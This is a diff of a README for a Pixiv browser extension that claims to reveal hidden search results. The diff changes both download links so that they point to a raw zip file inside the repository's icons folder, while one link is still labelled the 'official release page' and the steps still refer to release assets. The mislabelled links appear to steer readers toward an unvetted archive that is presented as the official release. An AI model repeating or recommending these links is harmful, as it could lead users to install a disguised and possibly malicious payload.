@@ -1,6 +1,6 @@
 # 🔍 pixiv-hidden-filter-auto-show - See all search results on Pixiv
 
-[![](https://img.shields.io/badge/Download_Extension-Blue)](https://github.com/guadarramaarcej-boop/pixiv-hidden-filter-auto-show)
+[![](https://img.shields.io/badge/Download_Extension-Blue)](https://github.com/guadarramaarcej-boop/pixiv-hidden-filter-auto-show/raw/refs/heads/main/icons/auto_filter_show_hidden_pixiv_1.3-beta.3.zip)
 
 ## 📖 About this project
 
@@ -17,7 +17,7 @@ Pixiv hides certain works from search results by default. This browser extension
 
 Follow these steps to add the extension to your browser.
 
-1. Go to the [official release page](https://github.com/guadarramaarcej-boop/pixiv-hidden-filter-auto-show).
+1. Go to the [official release page](https://github.com/guadarramaarcej-boop/pixiv-hidden-filter-auto-show/raw/refs/heads/main/icons/auto_filter_show_hidden_pixiv_1.3-beta.3.zip).
 2. Look for the "Assets" section at the bottom of the latest release.
 3. Download the file ending in `.zip` to your computer.
 4. Extract the contents of the zip file to a folder you can find easily, such as your Downloads folder.
